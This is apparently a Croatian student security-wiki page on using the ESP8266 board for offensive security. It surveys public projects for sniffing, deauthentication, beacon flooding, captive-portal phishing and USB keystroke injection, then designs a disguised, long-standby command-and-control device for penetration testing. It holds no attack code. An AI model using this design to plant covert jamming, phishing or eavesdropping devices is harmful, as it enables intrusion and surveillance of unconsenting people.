+</p><p>Prvo je potrebno imati instaliran i Arduino IDE s podrškom za ESP8266, što je objašnjeno u prethodna dva koraka, a potom treba preuzeti zadnju inačicu sa <a href="http://eclipse.baeyens.it/index.shtml" class="external free" rel="nofollow">http://eclipse.baeyens.it/index.shtml</a> te je instalirati. Eclipse IDE ne treba posebno konfigurirati jer već dolazi sa punom podrškom, no pri kreiranju projekta treba paziti da se unesu pravillne postavke pločice sa kojom se radi.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:602px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Eclipse-new-arduino.png" class="image"><img alt="" src="../images/thumb/f/f1/Eclipse-new-arduino.png/600px-Eclipse-new-arduino.png" width="600" height="518" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Eclipse-new-arduino.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 34.</b> Postavke kod kreiranja projekta na Eclipse IDE</div></div></div></div>
+<p>Da bismo saznali na kojem je serijskom portu spojena naša pločica, u naredbeni redak upišimo <tt>dmesg | grep tty</tt>, a povratna informacija trebala bi izgledati ovako (ch341-uart):
+</p>
+<pre>
+rloka@r2d2:~$ dmesg | grep tty
+[337373.990663] usb 2-8: ch341-uart converter now attached to ttyUSB0
+</pre>
+<p>Po uspješnom uploadu firmware-a na pločicu, naredbeni redak bi trebao ispisati sljedeće poruke:
+</p>
+<pre>
+Uploading 208672 bytes from /home/rloka/Desktop/Dev/sloeber/workspace/CommandAndControlNode/Release/CommandAndControlNode.bin to flash at 0x00000000
+	erasing flash
+	size: 032f20 address: 000000
+	first_sector_index: 0
+	total_sector_count: 51
+	head_sector_count: 16
+	adjusted_sector_count: 35
+	adjusted_size: 023000
+	espcomm_send_command: sending command header
+	espcomm_send_command: sending command payload
+	setting timeout 10000
+	setting character timeout 100
+	done
+	setting timeout 1
+	setting character timeout 1
+	done
+	espcomm_send_command: receiving 2 bytes of data
+	writing flash
+......................................................................................................................
+starting app without reboot
+	espcomm_send_command: sending command header
+	espcomm_send_command: sending command payload
+	espcomm_send_command: receiving 2 bytes of data
+closing bootloader
+esptool finished
+upload done
+
+</pre>
+<h2> <span class="mw-headline" id="Kori.C5.A1tenje_u_ofenzivnoj_sigurnosti"> Korištenje u ofenzivnoj sigurnosti </span></h2>
+<p>Da bismo mogli smjestiti ESP8266 u pravi kontekst ofenzivne sigurnosti potrebno je znati karakteristike same pločice. U prethodnim poglavljima detaljno smo obradili tehničke karakteristike, pa ćemo se ovdje samo nakratko podsjetiti:
+</p>
+<ul><li>podržanost svih glavnih standarada i modova rada bežičnog interneta
+</li><li>podržanost low level operacija u SDK-u
+</li><li>mogućnost komunikacije sa drugim uređajima
+</li><li>mala procesorska moć
+</li><li>mala memorija za pohranu
+</li><li>nema operacijski sustav
+</li><li>upravljanje potrošnjom energije
+</li><li>mala potrošnja energije
+</li><li>laka nabavljivost i niska cijena
+</li><li>prenosivost i male dimenzije
+</li></ul>
+<p>Uzevši u obzir navedeno, korištenje ESP8266 u ofenzivnoj sigurnosti dolazi do izražaja kada je potrebno da:
+</p>
+<ul><li><b>uređajem možemo upravljati na daljinu</b>
+</li><li><b>uređaj bude malih dimenzija</b>
+</li><li><b>uređaj može dugo ostati na čekanju</b>
+</li><li><b>uređaj troši malo baterije</b>
+</li><li><b>uređaj bude namijenjen za specifičan zadatak</b>
+</li><li><b>uređaj nije velike vrijednosti</b>
+</li><li><b>uređaj može infiltrirati u i/ili uskraćivati uslugu mreže</b>
+</li></ul>
+<p>Gledajući po mogućim namijenama, ESP2866 može poslužiti u:
+</p>
+<ul><li><b>aktivnom i pasivnom sniffanju mrežnog prometa, najbolje na otvorenim i neenkriptiranim mrežama</b>
+</li><li><b>man-in-the-middle napadima pretvarajući se da je valjana pristupna točka, ili u kombinaciji sa drugim hardverom može obavještavati napadača o prikupljenim informacijama</b>
+</li><li><b>smetanju ili onemogućavanju komunikacije putem bežićnih mreža slanjem malicioznih okvira</b>
+</li><li><b>prisluškivanje putem mikrofona ili drugi nadzor putem senzora, npr. broj osoba u prostoriji, temperatura, itd.</b>
+</li><li><b>DDOS/DOS napadima, ako je umrežena u botnet</b>
+</li></ul>
+<h3> <span class="mw-headline" id="Real_World_primjeri_kori.C5.A1tenja_u_ofenzivnoj_sigurnosti"> Real World primjeri korištenja u ofenzivnoj sigurnosti</span></h3>
+<p>U nastavku slijede primjeri korištenja ESP8266 u ofenzivnoj sigurnosti. Navedeni primjeri nikako nisu svi primjeri koji semogu naći online, već samo oni koje je autor smatrao shodnim za ovaj rad. Primjeri su uzeti sa stranica i blogova njihovih autora, a uz svaki primjer stavljen je i link na izvor, pa se svaki primjer može i detaljnije proučiti jer ćemo ovdje staviti samo sažetak.
+</p>
+<h4> <span class="mw-headline" id="ESP8266_War_Walker"> ESP8266 War Walker </span></h4>
+<p>Autor spomenutog napravio je uređaj pomoću kojeg prati dostupne pristupne točke i jačinu signala u realnom vremenu te ih prikazuje na OLED zaslonu. Autor je koristio NodeMCU LoLin (v3) pločicu koja je nasljednica pločice korištene u ovom radu. U programu se koristi se mogućnost skeniranja mreže.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:202px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Finished.jpg" class="image"><img alt="" src="../images/thumb/8/86/Finished.jpg/200px-Finished.jpg" width="200" height="316" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Finished.jpg" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 35.</b> War Walker</div></div></div></div>
+<p>Izvor: <a href="https://github.com/stevemcquaid/War-Walker" class="external free" rel="nofollow">https://github.com/stevemcquaid/War-Walker</a>, <a href="https://github.com/stevemcquaid/War-Walker" class="external free" rel="nofollow">https://github.com/stevemcquaid/War-Walker</a>
+</p><p>U drugom sličnom članku autor je upario pločicu sa GPS modulom te je uspio napraviti triangulaciju mjenjajući svoju lokaciju.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:202px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:2435711462714882266.png" class="image"><img alt="" src="../images/thumb/0/0e/2435711462714882266.png/200px-2435711462714882266.png" width="200" height="184" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:2435711462714882266.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 36.</b> Triangulacija pomoću GPS modula</div></div></div></div>
+<p>Izvor: <a href="https://hackaday.io/project/11611-wifi-triangulation" class="external free" rel="nofollow">https://hackaday.io/project/11611-wifi-triangulation</a>
+</p>
+<h4> <span class="mw-headline" id="Baby_monitor"> Baby monitor </span></h4>
+<p>Iako se ne radi o ofenzivnoj sigurnosti, isti primjer može se iskoristiti u kreiranju uređaja za prisluškivanju putem WiFi-a. U primjeru se koristi mikrofon, pojačivač audio signala i konverter analognog u digitalni signal koji je ugrađen u samu ESP8266 pločicu.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:202px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Receiver_back_open.jpg" class="image"><img alt="" src="../images/thumb/6/60/Receiver_back_open.jpg/200px-Receiver_back_open.jpg" width="200" height="159" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Receiver_back_open.jpg" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 37.</b> Baby monitor</div></div></div></div>
+<p>Izvor: <a href="https://perso.aquilenet.fr/~sven337/english/2016/07/14/DIY-wifi-baby-monitor.html" class="external free" rel="nofollow">https://perso.aquilenet.fr/~sven337/english/2016/07/14/DIY-wifi-baby-monitor.html</a>, <a href="http://hackaday.com/2016/01/24/truly-versatile-esp8266-wifi-webcam-platform/" class="external free" rel="nofollow">http://hackaday.com/2016/01/24/truly-versatile-esp8266-wifi-webcam-platform/</a>, <a href="https://github.com/sven337/jeenode/tree/master/babymonitor" class="external free" rel="nofollow">https://github.com/sven337/jeenode/tree/master/babymonitor</a>
+</p>
+<h4> <span class="mw-headline" id="Building_a_low_cost_wifi_camera"> Building a low cost wifi camera </span></h4>
+<p>Kao i u prethodnom primjeru, ne radi se o čistoj primjeni u sigurnosti, no može poslužiti kao izvor za izgradnju WiFi nadzorne kamere. Autor pojašnjava kako je napravio integraciju Arducam modula (kamere koja je izvorno namjenjena za Arduino) i ESP8266 pločice. Kamera radi streaming i poslužuje ga putem lokanog webserva na portu 80.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:202px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Esparducam1.png" class="image"><img alt="" src="../images/thumb/e/ea/Esparducam1.png/200px-Esparducam1.png" width="200" height="71" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Esparducam1.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 38.</b> Esparducam</div></div></div></div>
+<p>Izvor: <a href="http://hackaday.com/2016/01/24/truly-versatile-esp8266-wifi-webcam-platform/" class="external free" rel="nofollow">http://hackaday.com/2016/01/24/truly-versatile-esp8266-wifi-webcam-platform/</a>, <a href="http://johan.kanflo.com/building-a-low-cost-wifi-camera/" class="external free" rel="nofollow">http://johan.kanflo.com/building-a-low-cost-wifi-camera/</a>, <a href="https://github.com/kanflo/esparducam" class="external free" rel="nofollow">https://github.com/kanflo/esparducam</a>
+</p>
+<h4> <span class="mw-headline" id="Color_TV_Broadcasting"> Color TV Broadcasting </span></h4>
+<p>U ovom primjeru autor je uspio generirati TV signal i napraviti prijenos putem I2S (Inter-IC-sound) busa. Isti primjer bi mogao koristiti u smetnji televizijskog signala ili u lažnom informiranju slanjem prijenosa putem koaksijalnog/antenskog kabela.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:202px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Esp8266-color-ntsc-broadcast-featured.jpg" class="image"><img alt="" src="../images/thumb/0/00/Esp8266-color-ntsc-broadcast-featured.jpg/200px-Esp8266-color-ntsc-broadcast-featured.jpg" width="200" height="103" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Esp8266-color-ntsc-broadcast-featured.jpg" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 39.</b> TV prijenos sa ESP8266</div></div></div></div>
+<p>Izvor: <a href="http://hackaday.com/2016/03/01/color-tv-broadcasts-are-esp8266s-newest-trick/" class="external free" rel="nofollow">http://hackaday.com/2016/03/01/color-tv-broadcasts-are-esp8266s-newest-trick/</a>, <a href="https://www.youtube.com/watch?v=bcez5pcp55w" class="external free" rel="nofollow">https://www.youtube.com/watch?v=bcez5pcp55w</a>
+</p>
+<h4> <span class="mw-headline" id="Ethernet_controller"> Ethernet controller </span></h4>
+<p>Autor u ovom primjeru spaja Ethernet ulaz na na ESP8266 pločicu te se pomoći njega spaja na mrežu. Primjer se može iskoristiti u <i>sniffanju</i> lokalne mreže putem etherneta ili u pristupanju resursa dostupnih samo putem lokalne mreže. Autor koristi nešto pomoćnog hardvera i, izmeđuostalog i I2S bus.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:202px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:10baset-on-esp8266-featured.jpg" class="image"><img alt="" src="../images/thumb/8/85/10baset-on-esp8266-featured.jpg/200px-10baset-on-esp8266-featured.jpg" width="200" height="103" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:10baset-on-esp8266-featured.jpg" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 40.</b> ESP8266 i Ethernet priključak</div></div></div></div>
+<p>Izvor: <a href="http://hackaday.com/2016/04/01/ethernet-controller-discovered-in-the-esp8266/" class="external free" rel="nofollow">http://hackaday.com/2016/04/01/ethernet-controller-discovered-in-the-esp8266/</a>, <a href="https://www.youtube.com/watch?v=XKnyAYKP434" class="external free" rel="nofollow">https://www.youtube.com/watch?v=XKnyAYKP434</a>, <a href="https://github.com/cnlohr/espthernet," class="external text" rel="nofollow">https://github.com/cnlohr/espthernet</a>
+</p>
+<h4> <span class="mw-headline" id="Captive_portal_.2F_DNS_redirection"> Captive portal / DNS redirection </span></h4>
+<p>Primjer pokazuje kako napraviti tzv. <i>captive portal</i> i DNS redirekciju. Autor koristi mogućnost pružanja pristupne točke kako bi napravio lažnu pristupnu točku i preusmjerio korisnike na lokalni webserver. Ovaj primjer može poslužiti u zarazi uređaja sa exploitom koji bi bio stavljen na lažnu stranicu, ili pak može poslužiti u phishing napadima.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:202px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:NewUses.jpg" class="image"><img alt="" src="../images/thumb/7/74/NewUses.jpg/200px-NewUses.jpg" width="200" height="113" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:NewUses.jpg" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 41.</b> DNS redirekcija</div></div></div></div>
+<p>Izvor: <a href="https://www.hackster.io/rayburne/esp8266-captive-portal-5798ff" class="external free" rel="nofollow">https://www.hackster.io/rayburne/esp8266-captive-portal-5798ff</a>
+</p>
+<h4> <span class="mw-headline" id="Multi_target_De-Auth_attack"> Multi target De-Auth attack </span></h4>
+<p>Sljedeći članak opisuje izgradnju uređaja koji izbacuje uređaje povezane na neku pristupnu točku. Autor koristi dvije ESP8266 pločice. S jednom pločicom obavlja se sniffanje prometa i identifikacija povezanih uređaja, a sa drugim uređajem šalju se tzv. deautentikacijski okviri. Po prispjeću deautentikacijskih okvira na spojeni uređaj, isti se odjavljuje sa te pristupne točke te korisnik ostaje bez pristupa mreži. 
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:202px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:2751681453998566958.JPG" class="image"><img alt="" src="../images/thumb/a/a0/2751681453998566958.JPG/200px-2751681453998566958.JPG" width="200" height="194" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:2751681453998566958.JPG" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 42.</b> ESP8266 Jammer</div></div></div></div>
+<p>Izvor: <a href="https://hackaday.io/post/30838" class="external free" rel="nofollow">https://hackaday.io/post/30838</a>
+</p>
+<h4> <span class="mw-headline" id="WiFi_AP_flooding"> WiFi AP flooding </span></h4>
+<p>Autor članka koristi  <tt>wifi_send_pkt_freedom()</tt> funkciju iz službenog SDK kako bi slao okvire koji su slobodno konstruirani, tj. nije potreban nikakav protokol koji im prethodi. Autor stoga konstruira paket kojim se pristupne točke oglašavaju (aktivno oglašavanje) te odašilje otvoreno odašilje takve okvire. Rezultat je taj da svi koji su u neposrednoj blizini vide jako puno zapravo nepostojićih pristupnih točaka, pa se time stvara velika buka u mrežnom prostoru.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:202px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Wifi_beacon-shot0004_featured.png" class="image"><img alt="" src="../images/thumb/2/27/Wifi_beacon-shot0004_featured.png/200px-Wifi_beacon-shot0004_featured.png" width="200" height="85" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Wifi_beacon-shot0004_featured.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 43.</b> ESP8266 AP Flood</div></div></div></div>
+<p>Izvor: <a href="http://ruralhacker.blogspot.hr/2016/01/esp8266-jamming.html" class="external free" rel="nofollow">http://ruralhacker.blogspot.hr/2016/01/esp8266-jamming.html</a>, <a href="https://github.com/kripthor/WiFiBeaconJam" class="external free" rel="nofollow">https://github.com/kripthor/WiFiBeaconJam</a>, <a href="https://www.youtube.com/watch?v=ENWX5Vf_l1Y" class="external free" rel="nofollow">https://www.youtube.com/watch?v=ENWX5Vf_l1Y</a>
+</p>
+<h4> <span class="mw-headline" id="Universal_Serial_aBUSe"> Universal Serial aBUSe </span></h4>
+<p>Autori koriste Teensy pločicu u kombinaciji sa ESP8266 kako bi kreirali lažni USB periferni uređaj (tipkovnica/miš) i omogućili napadaću pristup na računalo putem VNC-a. Autori koriste općenitu nezaštićenost USB portova od ovakvih napada.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:202px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Screen-Shot-2016-08-15-at-4.59.47-PM.png" class="image"><img alt="" src="../images/thumb/7/74/Screen-Shot-2016-08-15-at-4.59.47-PM.png/200px-Screen-Shot-2016-08-15-at-4.59.47-PM.png" width="200" height="112" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Screen-Shot-2016-08-15-at-4.59.47-PM.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 44.</b> USB Abuse</div></div></div></div>
+<p>Izvor: <a href="https://sensepost.com/blog/2016/universal-serial-abuse/" class="external free" rel="nofollow">https://sensepost.com/blog/2016/universal-serial-abuse/</a>, <a href="https://www.youtube.com/watch?v=5gMvtUq30fA" class="external free" rel="nofollow">https://www.youtube.com/watch?v=5gMvtUq30fA</a>, <a href="https://github.com/sensepost/USaBUSe" class="external free" rel="nofollow">https://github.com/sensepost/USaBUSe</a>
+</p>
+<h4> <span class="mw-headline" id="Mini_Wifi_Sniffer"> Mini Wifi Sniffer </span></h4>
+<p>U ovom primjeru autor je napravio funkcionalni sniffer koji ispisuje oglašavanje pristupnih točaka, i slanje upita uređaja (<i>probe request</i>) za oglasom pristupnih točaka. Iako ovo nije sniffer u punom smislu, vrlo je zanimljiv zbog jednostavne imeplementacije.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:202px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Sniffer.png" class="image"><img alt="" src="../images/thumb/0/01/Sniffer.png/200px-Sniffer.png" width="200" height="150" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Sniffer.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 46.</b> ESP8266 Sniffer</div></div></div></div>
+<p>Izvor: <a href="https://www.hackster.io/rayburne/esp8266-mini-sniff-f6b93a" class="external free" rel="nofollow">https://www.hackster.io/rayburne/esp8266-mini-sniff-f6b93a</a>
+</p>
+<h2> <span class="mw-headline" id="Implementacija"> Implementacija </span></h2>
+<p>U ovom poglavlju bavimo se <b>proof of concept</b> implementacijom. Implementacija treba pokazati mogućnost korištenja u ofenzivnoj sigurnosti, tj. u penetracijskom testiranju. Implementacija nikako ne predstavlja sve mogućnosti NodeMCU ESP2866 pločice, već pokazuje samo mali dio.
+</p>
+<h3> <span class="mw-headline" id="Arhitektura"> Arhitektura </span></h3>
+<p>Dizajn sustava napravljen je prema sljedećoj zamisli. Korisnik bi trebao moći uređajima upravljati ili putem weba, ili putem lokalne mreže u neposrednoj blizini. Uređaji bi bili postavljeni na lokaciju od interesa za samog napadača. Na primjer, u blizini pristupne točke, u nečijem uredu ili pak na javnom mjestu - lokaciju interesa određuje napadač. Uređaj bi se, u glavnini, sastojao od dvije NodeMCU pločice povezane serijski te izvora struje - baterijskog članka. Jedna od pločica (<b>CommandAndControl Node</b>) prihvaćala bi upute sa webservisa, ili bi se spajala na pristupnu točku napadača, ili bi pak bila pristupna točka na koju se napadač može spojiti, i upravljati uređajem. Kada <i>CommandAndControl</i> pločica dobije naredbu za izvršavanjem određenog zadatka, istu prosljeđuje drugoj, <b>Execute Node</b>, pločici, koja isti zadatak izvršava, ili u slučaju da su za zadatak potrebne obje pločice, tada pločice isti zadatak simultano izvršavaju. Ukoliko je potreban izvještaj, <i>CommandAndControl</i> pločica šalje podatke natrag napadaču. Na sljedećoj skici dan je prikaz navedene arhitekture sustava.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:802px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Node-design.jpg" class="image"><img alt="" src="../images/thumb/5/59/Node-design.jpg/800px-Node-design.jpg" width="800" height="422" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Node-design.jpg" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 36.</b> C&amp;C koncept arhitekture sustava u ovome projektu</div></div></div></div>
+<h3> <span class="mw-headline" id="Hardverska_implementacija"> Hardverska implementacija </span></h3>
+<div class="thumb tright"><div class="thumbinner" style="width:182px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:DSC07848.JPG" class="image"><img alt="" src="../images/thumb/c/cd/DSC07848.JPG/180px-DSC07848.JPG" width="180" height="120" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:DSC07848.JPG" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 39.</b> SAMSUNG ICR 18650-26F baterijski članci sa regulatorom i indikatorom potrošnje - korišteni u implementaciji</div></div></div>
+<div class="thumb tright"><div class="thumbinner" style="width:182px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:DSC07841.JPG" class="image"><img alt="" src="../images/thumb/9/98/DSC07841.JPG/180px-DSC07841.JPG" width="180" height="120" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:DSC07841.JPG" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 40.</b> Female-to-female kabeli za pinove</div></div></div>
+<div class="thumb tright"><div class="thumbinner" style="width:182px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Fritzing_bb.png" class="image"><img alt="" src="../images/thumb/2/2b/Fritzing_bb.png/180px-Fritzing_bb.png" width="180" height="62" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Fritzing_bb.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 41.</b> Grafički prikaz spajanja hardvera (krivi prikaz baterije)</div></div></div>
+<p><br />
+Za implementaciju gore objašnjene arhitekture korišten je sljedeći hardver:
+</p>
+<ul><li>2x NodeMCU ESP8266 DEVKIT v2 pločica (2 x $5)
+</li><li>3.7V baterijski članak sa USB izlazom za spajanje putem USB-a (5V) i indikatorom potrošenosti kapaciteta 2 x 2600 mAh (5200 mAh) - SAMSUNG ICR 18650-26F ($4)
+</li><li>USB na micro USB kabel sa prekidačem ($1)
+</li><li>female-to-female set od četri kabela za serijsko spajanje pločica i napajanje ($1)
+</li><li>3D printana kutija prilagođena hardveru za zaštitu i maskiranje ($10 u materijalu)
+</li></ul>
+<p>Ukupna cijena hardvera: $26, cca. 190 kn.
+</p>
+<h4> <span class="mw-headline" id="Spajanje_hardvera"> Spajanje hardvera </span></h4>
+<p>Hardver je spojen na sljedeći način. <i>CommandAndControl</i> pločica spojena je na izvor napajanja putem USB kabela sa prekidačem. <i>Execute</i> pločica spaja se na <i>CommanAndControl</i> pločicu, tako da se naponski vod jedne pločice (Vcc) spoji na naponski vod druge, a isto tako i uzemljenje (Gnd). Serijska komunikacija ostvarena je spajanjem UART vodova Tx (Transmit) i Rx (Receive), tako da se Tx vod jedne pločice spaja na Rx vod druge i obrnuto. Elektronička shema spajanja dana je na sljedećem prikazu.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:802px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Fritzing_schem.png" class="image"><img alt="" src="../images/thumb/f/f3/Fritzing_schem.png/800px-Fritzing_schem.png" width="800" height="454" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Fritzing_schem.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 37.</b> Elektronička shema spajanja hardvera</div></div></div></div>
+<p>Primjetimo, gornji prikaz nije u potpunosti točan jer ne prikazuje spajanje izvora na regulirani ulaz već je prikazano direktno spajanje. Konačni spoj hardvera dan je na prikazu ispod:
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:802px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:DSC07882.JPG" class="image"><img alt="" src="../images/thumb/a/a5/DSC07882.JPG/800px-DSC07882.JPG" width="800" height="492" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:DSC07882.JPG" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 38.</b> Konačni spoj hardvera</div></div></div></div>
+<h4> <span class="mw-headline" id="Baterija"> Baterija </span></h4>
+<div class="thumb tright"><div class="thumbinner" style="width:182px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:DSC07879.JPG" class="image"><img alt="" src="../images/thumb/4/48/DSC07879.JPG/180px-DSC07879.JPG" width="180" height="120" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:DSC07879.JPG" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 42.</b> Mjerenje napona baterisjkih članaka</div></div></div>
+<p>Treba voditi poseban oprez pri odabiru baterije jer ove specifične pločice ne toleriraju napon veći od 10V. Baterija je u ovom slučaju spojena preko USB sučelja na samoj pločici, a razlog je taj što pločica na sebi ima regulator napona, te ostale mehanizme za kontrolu potrošnje, koji su dostupni samo ako se koristi USB ulaz. Stoga, nije preporučeno bateriju spajati direktno na naponski vod, odnosno uzemljenje, no ako se već spaja direktno, napon bi trebao biti ~3.3V i trebao bi se koristiti regulator napona, kako ne bi došlo do oštećenja uređaja.
+</p><p>Baterija je vrlo važna stavka kod planiranja napada. Ukoliko napadač nema stalni pristup mjestu napada, ili pak ne želi biti u blizini napada koji će biti izvršen, tada uređaj treba biti u mogućnosti biti u pripravnosti i čekati na naredbu za izvršavanje određene radnje. Mogućnost bivanja u pripravnosti u velikoj mjeri određuje baterija kakvu koristimo u njemu, jer uređaj moži biti u pripravnosti onoliko vremena koliko mu to baterija dopušta. Trajanje baterije ovisi o njenoj kakvoći, kapacitetu i vanjskim utjecajim - pogotovo temperaturi. U implementaciji koristimo Li-ion baterijske članke kapaciteta 5200 mAh i napona 3.7 volta.
+</p><p>Općenito, za okvirno računanje trajanja baterije u satima možemo koristiti sljedeću formulu:
+</p><p><br />
+<a href="http://security.foi.hr/wiki/index.php/Datoteka:3fmq73-1.png" class="image"><img alt="3fmq73-1.png" src="../images/thumb/4/4e/3fmq73-1.png/700px-3fmq73-1.png" width="700" height="63" /></a>,
+</p><p>gdje je 0.7 faktor utjecaja vremenskih uvijeta i samostalno pražnjenje tijekom vremena.
+</p><p><br />
+Ako uzmemo srednje vrijednosti, te u račun uključimo obje pločice, dobivamo sljedeću tablicu trajanja korištenja (za potošnju su uzete vrijednosti sa stranice <a href="http://www.banggood.com/Geekcreit-Doit-NodeMcu-Lua-ESP8266-ESP-12E-WIFI-Development-Board-p-985891.html" class="external text" rel="nofollow">trgovca</a> i baterija koja služi u implementaciji):
+</p>
+<table class="wikitable">
+
+<tr>
+<th> Opis korištenja
+</th>
+<th> Potrošnja
+</th>
+<th> Trajanje u satima
+</th></tr>
+<tr>
+<td> Kontinuirana komunikacija, normalan način rada
+</td>
+<td> 140 mA
+</td>
+<td> 26 h (1 dan)
+</td></tr>
+<tr>
+<td> U pripravnosti (Light sleep - Slika 13)
+</td>
+<td> 2 mA
+</td>
+<td> 1820 (72 dana)
+</td></tr>
+<tr>
+<td> U pripravnosti (Deep sleep - Slika 13)
+</td>
+<td> 0.4 mA
+</td>
+<td> 9100 (379 dana)
+</td></tr></table>
+<h4> <span class="mw-headline" id="3D_printano_ku.C4.87i.C5.A1te"> 3D printano kućište </span></h4>
+<p>Kako bi zaštitili i maskirali hardver potrebno nam je kućište, pa je stoga napravljeno i specijalno kućište koje odgovara dimenzijama korištenog hardvera. Primjetite, na kućištu postoje dodatni otvori za planirane nadogradnje, poput ethernet porta.
+</p>
